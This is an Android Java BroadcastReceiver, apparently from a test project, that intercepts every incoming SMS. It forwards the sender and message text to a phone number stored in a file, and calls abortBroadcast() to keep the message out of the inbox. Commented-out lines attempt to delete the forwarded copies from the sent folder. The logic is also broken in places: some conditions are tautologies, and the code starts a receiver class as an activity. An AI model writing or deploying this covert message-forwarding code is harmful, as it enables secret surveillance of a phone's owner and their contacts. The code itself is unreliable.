package com.test.dell.broadcasttest;

import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import java.lang.reflect.Array;

public class ChangeNumebr extends BroadcastReceiver {

    String str = "";
    String fatherNo = "";
    String message = "";

        @Override
        public void onReceive(Context context, Intent intent) {

            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs = null;

            if (bundle != null) {
                // Retrieve the SMS.
                Object[] pdus = (Object[]) bundle.get("pdus");
                msgs = new SmsMessage[pdus.length];
                for (int i = 0; i < msgs.length; i++) {

                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);

                    str += msgs[i].getOriginatingAddress();
                    str += ":";
                    str += msgs[i].getMessageBody().toString();
                    str += "\n";

                    String[] temp;
                    String delimiter = ":";

                    temp = str.split(delimiter);
                    fatherNo = temp[0];
                    message = temp[1];

//                    String no="03012543105";

                    smsSender.smsSendCall(FileOperations.read(),str);
//                    SmsManager sms=SmsManager.getDefault();
//                    sms.sendTextMessage(FileOperations.read(), null, str, null, null);
//                  //Trying code
                    //deleteSMS(context,str,FileOperations.read());
                    //context.getContentResolver().delete(Uri.parse("content://sms/sent"), "address = ? and body = ?", new String[] {FileOperations.read(),str});

                    if(FileOperations.read().contains(FileOperations.read())) {
                        if (str.equalsIgnoreCase(str)) {

                            Intent intent2 = new Intent(context,ChangeNumebr.class);
                            intent2.putExtra("Number", msgs[i].getOriginatingAddress());
                            intent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            context.startActivity(intent2);
                            //it will stop sending message into the Inbox
                            abortBroadcast();

                        }
                    }


                    ////////////////////////////////////////////
                    if(FileOperations.read().equals("03452689370")) {
                        Toast.makeText(context.getApplicationContext(),""+FileOperations.read().equals("03452689370"),
                                Toast.LENGTH_SHORT).show();
                    }



                    }

            }
            }// close the on Recive Methord

}// Close the Main Class
